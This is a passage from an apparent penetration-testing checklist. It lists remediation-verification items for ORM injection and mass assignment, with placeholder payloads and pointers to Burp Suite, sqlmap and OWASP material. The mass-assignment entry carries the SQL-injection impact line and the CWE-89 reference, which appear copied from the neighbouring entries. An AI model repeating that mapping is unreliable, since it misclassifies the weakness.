**Test Category:** Remediation Verification · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** After fix is applied, re-test all confirmed injection points with original and variant payloads

**Expected Result:** All injection variants properly mitigated

**Payload Example:**

```
Re-run all successful payloads + bypass variants
```

**Impact:** Verify parameterized/ORM-safe query fix holds

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-230 — ORM Injection - Test Parameterized Query Implementation
**Test Category:** Remediation Verification · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Verify that parameterized queries / prepared statements are properly implemented

**Expected Result:** Parameters properly bound, injection fails

**Payload Example:**

```
All original injection payloads
```

**Impact:** Verify parameterized/ORM-safe query fix holds

**Tools:** Code review, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-231 — Mass Assignment - Verify Allowlist Implementation
**Test Category:** Remediation Verification · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All API endpoints

**Test Steps:** After fix, attempt mass assignment with all previously discovered hidden parameters

**Expected Result:** All extra parameters properly ignored

**Payload Example:**

```
Re-send all hidden parameter payloads
```

**Impact:** Verify parameterized/ORM-safe query fix holds

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---
